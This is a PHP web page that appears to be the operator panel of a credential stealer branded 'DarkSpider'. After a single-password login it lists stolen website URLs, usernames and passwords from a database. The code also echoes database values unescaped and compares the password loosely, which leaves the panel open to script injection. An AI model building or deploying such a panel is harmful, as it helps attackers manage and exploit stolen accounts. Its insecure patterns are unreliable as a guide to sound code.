<!DOCTYPE html>
<html>
<head>
<link rel="stylesheet" href="assets/css/spider_ui.css">
<script
  src="https://code.jquery.com/jquery-3.3.1.min.js"
  integrity="sha256-FgpCb/KJQlLNfOu91ta32o/NMZxltwRo8QtmkMRdAu8="
  crossorigin="anonymous"></script>
</head>
<body>
<?php


include("config.php");
if(isset($_POST['submit_pass']) && $_POST['pass'])
{
 $pass=$_POST['pass'];
 if($pass==$password )
 {
  $_SESSION['password']=$pass;
 }
 else
 {
  $error="Incorrect Pssword";
 }
}

if(isset($_POST['page_logout']))
{
 unset($_SESSION['password']);
}


$statement = $pdo->prepare("SELECT * FROM urls");
$statement->execute();


$html = "<table class='spider'>
    <thead>
        <tr>
            <th>URL</th>
            <th>USERNAME</th>
            <th>PASSWORD</th>
        </tr>
    </thead>
    <tbody>
";
while($row = $statement->fetch()) {
    if(!empty($row["url"])){
        $html .= '<tr>
                    <td>'.$row['url'].'</td>
                    <td>'.$row['username'].'</td>
                    <td>'.$row['password'].'</td>
                </tr>';
    }
}
$html .= "</tbody></table>";


if($_SESSION['password']==$password )
{
?>

<div class="header">

   <div class="header-logo">
         <img src="assets/img/lime_icon.ico">
   </div>
    <div class="header-filter todo">
        Header Filter: HERE IS SOME TODO
    </div>

</div>




<div style="width: 100%;">
<? echo $html; ?>
</div>

 <?php
}
else
{
 ?>

    <div class="login">
        <div class="login-center">
        <img src="assets/img/lime_icon.ico">
            <form method="post" action="" id="login_form">
                <h1>LOGIN TO PROCEED</h1>
                <input  class="button btn-login" type="password" name="pass" placeholder="*******">
                <input class="button btn-submit" type="submit" name="submit_pass" value="LOGIN">
                <p><font style="color:red;"><?php echo $error;?></font></p>
                <p>
                   CC DarkSpider
                </p>
            </form>
        </div>
    </div>
  <?php	
}
?>
</body>
</html>